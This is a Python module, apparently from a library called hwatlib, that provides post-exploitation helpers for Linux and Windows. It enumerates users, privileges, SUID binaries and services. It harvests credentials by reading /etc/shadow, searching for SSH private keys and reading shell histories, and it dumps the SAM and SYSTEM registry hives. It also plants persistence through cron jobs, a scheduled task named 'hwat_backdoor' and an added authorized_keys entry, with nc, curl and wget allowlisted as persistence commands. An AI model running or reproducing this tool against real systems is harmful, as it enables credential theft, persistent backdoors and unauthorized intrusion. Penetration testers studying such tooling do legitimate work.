import argparse
import getpass
import json
import os
import platform
import re
import shlex
import socket
import subprocess
from pathlib import Path
from typing import List, Optional, Sequence, Tuple, Union


_CRON_SCHEDULE_RE = re.compile(r"^[\d\*/,\-]+(\s+[\d\*/,\-]+){4}$")
_ALLOWED_STATE_CHANGE_BINARIES = {
    "bash",
    "sh",
    "python",
    "python3",
    "perl",
    "ruby",
    "php",
    "nc",
    "netcat",
    "curl",
    "wget",
}
_ALLOWED_SCHTASK_SCHEDULES = {"MINUTE", "HOURLY", "DAILY", "WEEKLY", "MONTHLY", "ONLOGON", "ONSTART", "ONIDLE", "ONCE"}


def _run_argv(argv: Sequence[str], *, input_text: Optional[str] = None) -> Tuple[int, str]:
    try:
        result = subprocess.run(
            list(argv),
            shell=False,
            check=False,
            capture_output=True,
            text=True,
            input=input_text,
        )
        stdout = (result.stdout or "").strip()
        stderr = (result.stderr or "").strip()
        if stdout and stderr:
            return result.returncode, f"{stdout}\n{stderr}"
        return result.returncode, stdout or stderr
    except Exception as e:
        return 1, str(e)


def run_cmd(cmd: Union[Sequence[str], str]):
    """Run a command safely without a shell and return stdout/stderr text."""

    try:
        argv = shlex.split(cmd) if isinstance(cmd, str) else list(cmd)
        if not argv:
            return ""
        _rc, out = _run_argv(argv)
        return out
    except Exception as e:
        return str(e)


def _run_fallback(commands: Sequence[Sequence[str]]) -> str:
    last_out = ""
    for cmd in commands:
        rc, out = _run_argv(cmd)
        if rc == 0 and out:
            return out
        if out:
            last_out = out
    return last_out


def _is_allowed_state_change_command(cmd: str) -> bool:
    try:
        tokens = shlex.split(cmd)
    except Exception:
        return False
    if not tokens:
        return False
    head = os.path.basename(tokens[0]).lower()
    return head in _ALLOWED_STATE_CHANGE_BINARIES


def is_windows():
    return platform.system().lower() == "windows"


def is_linux():
    return platform.system().lower() == "linux"


def get_system_info():
    if is_windows():
        return get_system_info_windows()
    return get_system_info_unix()


def get_system_info_unix():
    return {
        "os": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "kernel": run_cmd(["uname", "-a"]),
        "whoami": getpass.getuser(),
    }


def get_system_info_windows():
    info = {}
    info["os"] = platform.system()
    info["platform"] = platform.platform()
    info["release"] = platform.release()
    info["version"] = platform.version()
    try:
        info["hostname"] = socket.gethostname()
    except Exception:
        info["hostname"] = run_cmd(["hostname"])
    info["whoami"] = run_cmd(["whoami"])
    info["systeminfo"] = run_cmd(["systeminfo"])
    return info


def get_users():
    return get_users_windows() if is_windows() else get_users_unix()


def get_users_unix():
    return run_cmd(["cat", "/etc/passwd"])


def get_users_windows():
    out = {}
    out["net_users"] = run_cmd(["net", "user"])
    out["local_groups"] = run_cmd(["net", "localgroup"])
    return out


def get_processes():
    return get_processes_windows() if is_windows() else get_processes_unix()


def get_processes_unix():
    return run_cmd(["ps", "aux"])


def get_processes_windows():
    return run_cmd(["tasklist", "/v"])


def get_network_info():
    return get_network_info_windows() if is_windows() else get_network_info_unix()


def get_network_info_unix():
    return _run_fallback((
        ["netstat", "-tunlp"],
        ["ss", "-tunlp"],
    ))


def get_network_info_windows():
    return {"ipconfig": run_cmd(["ipconfig", "/all"]), "netstat": run_cmd(["netstat", "-ano"])}


def check_sudo_rights():
    if is_windows():
        return check_privileges_windows()
    return run_cmd(["sudo", "-l"])


def check_privileges_windows():
    out = {}
    out["whoami"] = run_cmd(["whoami", "/priv"])
    out["groups"] = run_cmd(["whoami", "/groups"])
    out["user"] = run_cmd(["whoami"])
    return out


def find_suid_bins():
    if is_windows():
        return "Not applicable on Windows (use find services/scripts instead)"
    return run_cmd(["find", "/", "-perm", "-4000", "-type", "f"])


def check_kernel_exploits():
    """Return kernel / OS version string for manual lookup against exploit databases."""
    if is_windows():
        return f"{run_cmd(['ver'])}\n{run_cmd(['systeminfo'])}"
    return run_cmd(["uname", "-r"])


def search_ssh_keys():
    if is_windows():
        return search_ssh_keys_windows()

    # Prefer scoped search first to reduce noisy permission errors.
    out = run_cmd(["find", "/home", "-name", "id_rsa"])
    if out:
        return out
    return run_cmd(["find", "/", "-name", "id_rsa"])


def search_ssh_keys_windows():
    locations = []
    users_dir = os.environ.get("USERPROFILE", "C:\\Users")
    candidates = [
        os.path.join(users_dir, "*", ".ssh", "id_rsa"),
        os.path.join(users_dir, "*", ".ssh", "id_ed25519"),
    ]
    for c in candidates:
        locations.append(run_cmd(["cmd", "/c", f"dir /b /s \"{c}\""]))
    return "\n".join(locations)


def search_config_files():
    if is_windows():
        return _run_fallback((
            ["cmd", "/c", r"dir /s /b %USERPROFILE%\*.config"],
            ["cmd", "/c", r"dir /s /b %USERPROFILE%\*.xml"],
        ))
    return run_cmd(["find", "/", "-name", "*.conf", "-o", "-name", "*.ini", "-o", "-name", "*.yaml"])


def search_history():
    if is_windows():
        return run_cmd(
            [
                "powershell",
                "-NoProfile",
                "-Command",
                r"Get-ChildItem $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Microsoft.PowerShell_* -ErrorAction SilentlyContinue | Get-Content -ErrorAction SilentlyContinue",
            ]
        )

    lines: List[str] = []
    for home in Path("/home").glob("*"):
        hist = home / ".bash_history"
        if hist.is_file():
            try:
                lines.extend(hist.read_text(encoding="utf-8", errors="ignore").splitlines())
            except Exception:
                pass

    current = Path.home() / ".bash_history"
    if current.is_file():
        try:
            lines.extend(current.read_text(encoding="utf-8", errors="ignore").splitlines())
        except Exception:
            pass

    return "\n".join(lines)


def add_cronjob(cmd, schedule="* * * * *"):
    if is_windows():
        return add_schtask(cmd)
    return add_cronjob_confirmed(cmd, schedule=schedule, confirm=False)


def add_cronjob_confirmed(cmd, schedule="* * * * *", *, confirm: bool = False):
    """Add a cronjob (state-changing).

    Safer default: requires confirm=True and validated allowlisted command.
    """

    if not confirm:
        return "[-] Refusing to modify crontab without confirm=True"
    if not _CRON_SCHEDULE_RE.fullmatch(str(schedule).strip()):
        return "[-] Refusing to modify crontab: invalid cron schedule format"
    if not _is_allowed_state_change_command(cmd):
        return "[-] Refusing to modify crontab: command is not in allowlist"

    try:
        list_rc, existing = _run_argv(["crontab", "-l"])
        if list_rc != 0:
            existing = ""

        cron_entry = f"{schedule} {cmd}".rstrip() + "\n"
        new_crontab = (existing + "\n" + cron_entry).strip() + "\n"

        rc, out = _run_argv(["crontab", "-"], input_text=new_crontab)
        if rc == 0:
            return "[+] Cronjob added."
        return f"[-] Failed to add cronjob: {out}"
    except Exception as e:
        return f"[-] Failed to add cronjob: {e}"


def add_schtask(cmd, name="hwat_backdoor", schedule="MINUTE"):
    return add_schtask_confirmed(cmd, name=name, schedule=schedule, confirm=False)


def add_schtask_confirmed(cmd, name="hwat_backdoor", schedule="MINUTE", *, confirm: bool = False):
    """Add a scheduled task (state-changing).

    Safer default: requires confirm=True and validated allowlisted command.
    """

    if not confirm:
        return "[-] Refusing to create a scheduled task without confirm=True"
    if not _is_allowed_state_change_command(cmd):
        return "[-] Refusing to create scheduled task: command is not in allowlist"

    normalized = str(schedule or "").upper().strip()
    if normalized not in _ALLOWED_SCHTASK_SCHEDULES:
        return "[-] Refusing to create scheduled task: invalid schedule"

    try:
        return run_cmd(["schtasks", "/Create", "/SC", normalized, "/TN", str(name), "/TR", str(cmd), "/F"])
    except Exception as e:
        return str(e)


def backdoor_ssh(pubkey):
    return backdoor_ssh_confirmed(pubkey, confirm=False)


def backdoor_ssh_confirmed(pubkey, *, confirm: bool = False):
    """Append a public key to authorized_keys (state-changing).

    Safer default: requires confirm=True.
    """

    if not confirm:
        return "[-] Refusing to modify authorized_keys without confirm=True"
    if is_windows():
        return "SSH backdoor via authorized_keys is not applicable in the same way on Windows"
    try:
        ssh_dir = os.path.expanduser("~/.ssh")
        os.makedirs(ssh_dir, exist_ok=True)
        auth_keys = os.path.join(ssh_dir, "authorized_keys")
        with open(auth_keys, "a", encoding="utf-8") as f:
            f.write(pubkey.strip() + "\n")
        return f"[+] Backdoor SSH key added to {auth_keys}"
    except Exception as e:
        return f"[-] Failed to add SSH key: {e}"


def find_network_shares():
    return _run_fallback((
        ["showmount", "-e"],
        ["smbclient", "-L", "localhost", "-N"],
    )) if not is_windows() else run_cmd(["net", "view", "/all"])


def dump_passwd_shadow():
    if is_windows():
        return "Not applicable on Windows; see registry hives functions"
    return run_cmd(["cat", "/etc/shadow"])


def extract_hashes_windows(save_dir=None):
    return extract_hashes_windows_confirmed(save_dir=save_dir, confirm=False)


def extract_hashes_windows_confirmed(save_dir=None, *, confirm: bool = False):
    """Attempt to save Windows registry hives (state-changing).

    Safer default: requires confirm=True.
    """

    if not confirm:
        return "[-] Refusing to save registry hives without confirm=True"
    if not is_windows():
        return "Windows-only function."

    out = {}
    if save_dir:
        os.makedirs(save_dir, exist_ok=True)
        sam_path = os.path.join(save_dir, "SAM")
        system_path = os.path.join(save_dir, "SYSTEM")
    else:
        sam_path = "sam_backup"
        system_path = "system_backup"

    out["SAM"] = run_cmd(["reg", "save", r"HKLM\SAM", sam_path])
    out["SYSTEM"] = run_cmd(["reg", "save", r"HKLM\SYSTEM", system_path])
    return out


def list_services_windows():
    if not is_windows():
        return "Windows-only"
    return run_cmd(["sc", "query", "type=", "service", "state=", "all"])


def list_scheduled_tasks():
    if is_windows():
        return run_cmd(["schtasks", "/query", "/fo", "LIST", "/v"])

    scheduled = run_cmd(["crontab", "-l"])
    cron_lines = ["## user crontab", scheduled or ""]
    cron_dirs = ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.weekly", "/etc/cron.monthly"]

    for d in cron_dirs:
        p = Path(d)
        if not p.exists() or not p.is_dir():
            continue
        for f in sorted(p.iterdir()):
            if not f.is_file():
                continue
            try:
                cron_lines.append(f"\n## {f}")
                cron_lines.append(f.read_text(encoding="utf-8", errors="ignore"))
            except Exception:
                continue

    return "\n".join(cron_lines).strip()


def enum_installed_programs_windows():
    if not is_windows():
        return "Windows-only"

    out = run_cmd(["wmic", "product", "get", "name,version"])
    if out:
        return out
    return run_cmd(
        [
            "powershell",
            "-NoProfile",
            "-Command",
            "Get-WmiObject -Class Win32_Product | Select-Object Name,Version",
        ]
    )


def enum_weak_services_windows():
    if not is_windows():
        return "Windows-only"
    raw = run_cmd(["sc", "queryex", "type=", "service", "state=", "all"])
    cfg = run_cmd(["wmic", "service", "get", "Name,DisplayName,PathName,StartMode,State", "/format:list"])
    return {"raw_services": raw, "service_configs": cfg}


def find_common_windows_credentials():
    if not is_windows():
        return "Windows-only"
    results = {}
    userprofile = os.environ.get("USERPROFILE", "C:\\Users")
    patterns = [".rdp", ".xml", ".config", ".env", ".ini", ".json", ".log", ".sql", ".db", ".mdb"]
    hits = []
    for root, _dirs, files in os.walk(userprofile):
        for f in files:
            lf = f.lower()
            if any(lf.endswith(ext) for ext in patterns):
                hits.append(os.path.join(root, f))
        if root.count(os.sep) - userprofile.count(os.sep) > 4:
            continue
    results["hits_sample"] = hits[:200]
    return results


def full_recon():
    report = {}
    report["system_info"] = get_system_info()
    report["whoami_priv"] = check_privileges_windows() if is_windows() else run_cmd(["id"])
    report["sudo_rights"] = check_sudo_rights()
    report["suid_bins"] = find_suid_bins() if not is_windows() else None
    report["kernel_version"] = check_kernel_exploits()
    report["ssh_keys"] = search_ssh_keys()
    report["config_files"] = search_config_files()
    report["bash_history"] = search_history()
    report["network_shares"] = find_network_shares()
    if is_windows():
        report["services"] = list_services_windows()
        report["scheduled_tasks"] = list_scheduled_tasks()
        report["installed_programs"] = enum_installed_programs_windows()
        report["weak_services"] = enum_weak_services_windows()
        report["common_creds"] = find_common_windows_credentials()
    return report


def pretty_report(report):
    try:
        return json.dumps(report, indent=2, default=str)
    except Exception:
        return str(report)


def main(argv: Optional[List[str]] = None) -> int:
    parser = argparse.ArgumentParser(prog="hwat-post", description="hwatlib post-exploitation helpers")
    parser.parse_args(argv)

    print(pretty_report(full_recon()))
    return 0
